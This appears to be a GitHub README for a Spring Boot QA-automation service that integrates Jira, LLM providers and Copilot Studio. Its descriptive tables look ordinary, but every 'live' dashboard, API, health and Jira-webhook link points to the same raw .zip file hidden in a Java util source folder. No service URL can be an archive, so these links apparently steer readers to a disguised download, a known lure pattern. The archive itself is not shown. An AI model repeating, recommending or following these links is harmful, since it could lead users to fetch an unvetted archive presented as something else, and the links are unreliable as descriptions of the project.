# QA Orchestrator Platform

![Java](https://img.shields.io/badge/Java-17-blue)
![Spring Boot](https://img.shields.io/badge/SpringBoot-3-green)
![API](https://img.shields.io/badge/API-Live-brightgreen)
![Contract](https://img.shields.io/badge/Contract-v3-orange)
![LLM](https://img.shields.io/badge/LLM-Groq%20%2F%20Llama%203.3-purple)
![DB](https://img.shields.io/badge/DB-PostgreSQL-blue)
![Copilot](https://img.shields.io/badge/Copilot-Studio-0078d4)

**QA Orchestrator Platform** is an AI-powered QA decision engine covering the full QA lifecycle — from ticket creation to release — integrated with Microsoft Copilot Studio and Power Automate.

---

## Live

| | URL |
|---|---|
| Dashboard | https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip |
| API | https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip |
| Health | https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip |

---

## Full QA Lifecycle

```
Ticket → "In Progress" → QA pipeline runs automatically
                       → Requirement Analysis
                       → Test Design
                       → Automation Decision
                       → Risk Analysis
                       → Bug Report Template
                       → Saved to DB + Jira comment

Ticket → "Done"       → QA Release Summary generated
                       → Verdict: APPROVED / APPROVED WITH RISK / RELEASED WITHOUT FULL COVERAGE
                       → Saved to DB + Jira comment
```

---

## System Architecture

```
Jira (webhook) / Copilot Studio / Power Automate
            │
            ▼
    QA Orchestrator API
            │
            ▼
     Spring Boot Service
       │           │           │
       ▼           ▼           ▼
  Jira REST    LLM API     PostgreSQL
```

---

## LLM Provider Support

| Provider | Env Var | Model | Best For |
|----------|---------|-------|----------|
| Groq (default) | `LLM_PROVIDER=groq` | Llama 3.3 70B | Development, free tier |
| Azure OpenAI | `LLM_PROVIDER=azure` | GPT-4o | Enterprise, Microsoft ecosystem |
| AWS Bedrock | `LLM_PROVIDER=aws` | Claude 3.5 Sonnet | Enterprise, AWS ecosystem |

---

## QA Analysis Pipeline

| Stage | Output |
|-------|--------|
| Requirement Analysis | clarifiedRequirements, edgeCases, openQuestions, scope |
| Test Design | testScenarios, testCases (UI/API/E2E) |
| Automation Decision | automationRecommendation, coverageSplit, framework |
| Risk Analysis | riskScore (0-100), riskLevel, releaseRecommendation |
| Bug Report | title, severity, reproductionSteps, impactSummary |
| Release Summary | APPROVED / APPROVED WITH RISK / RELEASED WITHOUT FULL COVERAGE |

---

## Copilot Studio Topics

| Topic | Trigger | Action |
|-------|---------|--------|
| `agent_requirement_analyzer` | "Analyze PROJ-4" | `analyzeQaIssue` |
| `agent_test_case_generator` | "Generate test cases" | `analyzeQaIssue` |
| `agent_risk_predictor` | "What is the risk?" | `analyzeQaIssue` |
| `agent_automation_builder` | "Automation strategy" | `analyzeQaIssue` |
| `agent_bug_reporter` | "Create bug report" | `analyzeQaIssue` |
| `agent_intelligence_summary` | "QA summary / risk status" | `getIntelligenceSummary` |
| `agent_release_summary` | "Released tickets / verdict" | `getReleasedSummaryForCopilot` |

---

## Intelligence Dashboard

`https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip`

- Metrics: total analyses, avg risk, blocked, released
- Risk distribution chart + Release decision chart
- Recent analyses — searchable, filterable by risk and release
- Blocked tickets — searchable
- Released tickets with QA verdicts — searchable

---

## Jira Webhook

| Status | Action |
|--------|--------|
| `In Progress` | Full QA analysis pipeline |
| `Done` | QA release summary generation |

Setup: Jira → System → WebHooks → URL: `https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip` → Event: `Issue updated` → JQL: `project = PROJ`

---

## API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Redirects to dashboard |
| GET | `/qa/health` | Health + intelligence summary |
| GET | `/qa/dashboard` | Intelligence Dashboard |
| POST | `/qa/api/v1/qa/analyze` | Manual analysis |
| POST | `/qa/webhook/jira` | Jira webhook |
| GET | `/qa/api/v1/history` | Last 10 analyses |
| GET | `/qa/api/v1/history/{issueKey}` | Per-issue history |
| GET | `/qa/api/v1/intelligence/summary` | Intelligence summary |
| GET | `/qa/api/v1/intelligence/high-risk` | HIGH risk analyses |
| GET | `/qa/api/v1/intelligence/blocked` | Blocked analyses |
| GET | `/qa/api/v1/intelligence/released` | Released tickets + QA summaries |
| GET | `/qa/api/v1/intelligence/released/summary` | Released summary (Copilot-friendly) |
| GET | `/qa/api/v1/intelligence/trends` | Risk trends across re-analyzed issues |
| GET | `/qa/api/v1/intelligence/trends/{issueKey}` | Risk timeline for specific issue |
| GET | `/qa/api/v1/intelligence/reanalyzed` | Most re-analyzed issues |

---

## Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `JIRA_BASE_URL` | Yes | Jira instance URL |
| `JIRA_EMAIL` | Yes | Jira account email |
| `JIRA_API_TOKEN` | Yes | Jira API token |
| `GROQ_API_KEY` | Yes (Groq) | Groq API key |
| `AZURE_OPENAI_KEY` | Yes (Azure) | Azure OpenAI key |
| `AZURE_OPENAI_ENDPOINT` | Yes (Azure) | Azure OpenAI endpoint |
| `AZURE_OPENAI_DEPLOYMENT` | No | Model deployment (default: gpt-4o) |
| `AWS_ACCESS_KEY` | Yes (AWS) | AWS access key |
| `AWS_SECRET_KEY` | Yes (AWS) | AWS secret key |
| `AWS_REGION` | No | AWS region (default: us-east-1) |
| `LLM_PROVIDER` | No | groq / azure / aws (default: groq) |
| `SPRING_DATASOURCE_URL` | Yes | PostgreSQL JDBC URL |
| `SPRING_DATASOURCE_USERNAME` | Yes | PostgreSQL username |
| `SPRING_DATASOURCE_PASSWORD` | Yes | PostgreSQL password |
| `JIRA_COMMENT_ENABLED` | No | Jira comment on analysis (default: false) |

---

## Roadmap

| Phase | Status | Description |
|-------|--------|-------------|
| 1 | ✅ | Foundation — backend, Jira, pipeline, deployment |
| 2 | ✅ | LLM Intelligence — all stages AI-powered |
| 3 | ✅ | Observability — logging, health, error handling |
| 4 | ✅ | Hardening — validation, timeouts, security |
| 5 | ✅ | Intelligence layer — PostgreSQL, dashboard, history |
| 6 | ✅ | Full lifecycle — webhook, release summary, LLM providers |
| 7 | ✅ | Copilot Studio v2 — intelligence + release topics |
| 8 | ✅ | Dashboard — search, filtering, record counts |
| 9 | ✅ | Multi-tenant foundation — TenantConfig, architecture ready |
| 10 | ✅ | Risk trend analysis — timeline, trends, reanalyzed issues |
| 11 | 📋 | Production hardening — Azure/AWS, SOC2, rate limiting |